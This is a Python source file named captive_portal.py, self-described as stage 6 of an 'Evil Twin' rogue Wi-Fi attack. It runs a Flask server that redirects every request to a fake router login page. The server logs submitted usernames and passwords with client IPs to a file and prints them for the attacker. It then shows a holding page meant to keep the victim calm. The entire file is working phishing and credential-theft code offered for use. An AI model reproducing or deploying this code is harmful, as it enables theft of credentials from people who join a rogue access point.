"""
captive_portal.py – Credential Capture via Captive Portal
-----------------------------------------------------------
Runs a lightweight Flask web server on port 8080.
Combined with the iptables rules in rogue_ap.py, ALL HTTP/HTTPS traffic
from clients connected to the Evil Twin is redirected here.

The victim sees a login page that mimics a router authentication page.
When they submit credentials, we store them and show a "connecting..." page.

Stage 6 of the Evil Twin attack: Credential Capture.
"""

import threading
import datetime
from pathlib import Path
from flask import Flask, request, redirect, render_template, url_for

# ──────────────────────────────────────────────
# Storage for captured credentials
# ──────────────────────────────────────────────

CREDS_FILE = Path(__file__).parent / "captured_credentials.txt"

captured = []   # In-memory list of (timestamp, ip, username, password)


def _save_credential(ip: str, username: str, password: str):
    """Save captured credentials to memory and to a file."""
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = {"time": ts, "ip": ip, "username": username, "password": password}
    captured.append(entry)

    # Persist to file
    with open(CREDS_FILE, "a") as f:
        f.write(f"[{ts}] IP={ip}  USER={username}  PASS={password}\n")

    # Notify the attacker
    print(f"\n{'='*50}")
    print(f"[!!!] CREDENTIALS CAPTURED")
    print(f"      Time    : {ts}")
    print(f"      Client  : {ip}")
    print(f"      Username: {username}")
    print(f"      Password: {password}")
    print(f"{'='*50}\n")


# ──────────────────────────────────────────────
# Flask app
# ──────────────────────────────────────────────

app = Flask(
    __name__,
    template_folder=str(Path(__file__).parent / "templates")
)
app.secret_key = "evil_twin_secret"   # Required by Flask for sessions

# Callback: called when new credentials arrive (used by main tool for live feedback)
_on_credentials_callback = None


@app.route("/", methods=["GET"])
def index():
    """
    Root page: show the fake login form.
    This is what the victim sees when they open any website.
    """
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    """
    Handle form submission.
    Captures username and password, then shows a 'please wait' page
    to keep the victim calm while we've already got their credentials.
    """
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    client_ip = request.remote_addr

    if username or password:
        _save_credential(client_ip, username, password)
        if _on_credentials_callback:
            _on_credentials_callback(client_ip, username, password)

    return render_template("login.html", success=True)


@app.route("/<path:path>", methods=["GET", "POST"])
def catch_all(path):
    """
    Catch-all route: redirect ANY URL to the login page.
    This works together with DNS hijacking – the victim visits google.com,
    DNS resolves it to our IP, and this route catches the request.
    """
    return redirect(url_for("index"))


# ──────────────────────────────────────────────
# Public API
# ──────────────────────────────────────────────

class CaptivePortal:
    """Manages the Flask server lifecycle."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8080,
                 on_credentials=None):
        """
        Args:
            host:            Interface to bind to (0.0.0.0 = all interfaces)
            port:            Port to listen on (iptables redirects 80/443 here)
            on_credentials:  Optional callback(ip, username, password)
        """
        self.host = host
        self.port = port
        self._thread = None
        global _on_credentials_callback
        _on_credentials_callback = on_credentials

    def start(self):
        """Start Flask in a background daemon thread."""
        self._thread = threading.Thread(
            target=lambda: app.run(
                host=self.host,
                port=self.port,
                debug=False,
                use_reloader=False,   # Must be False when running in a thread
                threaded=True         # Handle multiple concurrent requests (phone sends several at once)
            ),
            daemon=True
        )
        self._thread.start()
        print(f"[+] Captive Portal running on {self.host}:{self.port}")
        print(f"[+] Credentials will be saved to: {CREDS_FILE}")

    def stop(self):
        """Flask doesn't have a clean stop from outside; daemon thread exits with main."""
        print("[+] Captive Portal stopped")

    def get_captured(self) -> list:
        """Return all captured credentials so far."""
        return list(captured)
